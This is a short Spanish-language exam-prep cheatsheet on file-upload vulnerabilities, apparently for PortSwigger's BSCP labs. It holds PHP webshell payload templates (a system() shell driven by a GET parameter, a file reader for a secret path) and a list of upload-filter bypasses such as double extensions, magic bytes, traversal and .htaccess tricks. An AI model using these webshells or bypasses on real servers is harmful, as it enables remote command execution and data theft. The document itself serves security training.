---
tipo: cheatsheet
vuln: file-upload
tags: [bscp, tipo/cheatsheet, vuln/file-upload]
relacionada: "[[File-Upload]]"
---

# CS · File Upload

## Flujo repetible
1. Sube un fichero de código y localiza su ruta.
2. Si hay filtro, evádelo (extensión, tipo, magic bytes, traversal).

## Detección
```
Sube un fichero de prueba y localiza la URL donde queda servido ({{BASE}}/files/...).
```

## Plantillas de payload
```php
<?php echo file_get_contents('{{SECRET_PATH}}'); ?>       // leer el secreto
<?php echo system($_GET['{{PARAM}}']); ?>                 // {{PARAM}} = {{CMD}} a ejecutar (webshell parametrizado)
```
```
Bypasses: shell.php.jpg · .phtml/.php5 · Content-Type spoof · GIF89a magic bytes
          ../shell.php (traversal) · .htaccess -> AddType php · race condition
```

## Escalada al objetivo
Ejecutar el shell → leer {{SECRET_PATH}}.

## Checklist
- [ ] Subí y localicé el fichero
- [ ] Evadí el filtro
- [ ] Ejecuté y leí el secreto

## Referencias
- https://portswigger.net/web-security/file-upload
